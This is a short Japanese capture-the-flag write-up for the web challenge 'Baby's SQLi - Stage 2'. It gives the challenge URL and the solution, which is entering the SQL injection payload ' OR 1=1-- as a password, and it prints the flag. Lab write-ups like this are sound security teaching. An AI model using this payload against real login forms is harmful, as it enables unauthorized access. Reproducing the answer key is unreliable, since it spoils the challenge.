Q24.[Web]Baby's SQLi - Stage 2-
----------------------

問題
----
```
200pt

うーん，ぱろっく先生深くまで逃げ込んでたか．
そこまで難しくは無いと思うんだけども……．

えっ？何の話か分からない？
さてはStage 1をクリアしてないな．
待っているから，先にStage 1をクリアしてからもう一度来てね．

Caution: sandbox.spica.bzの80,443番ポート以外への攻撃は絶対にしないようにお願いします．
```

解き方
-----
Q22の解答のURL[https://ctf.spica.bz/baby_sql/stage2_7b20a808e61c8573461cf92b1fe63b3f/index.php ](https://ctf.spica.bz/baby_sql/stage2_7b20a808e61c8573461cf92b1fe63b3f/index.php) にアクセスします。

単純なSQLインジェクションです。

```sql
' OR 1=1--
```

をパスワードに入力すれば良いです。

FLAG
-----
`cpaw{p@ll0c_1n_j@1l3:)}`
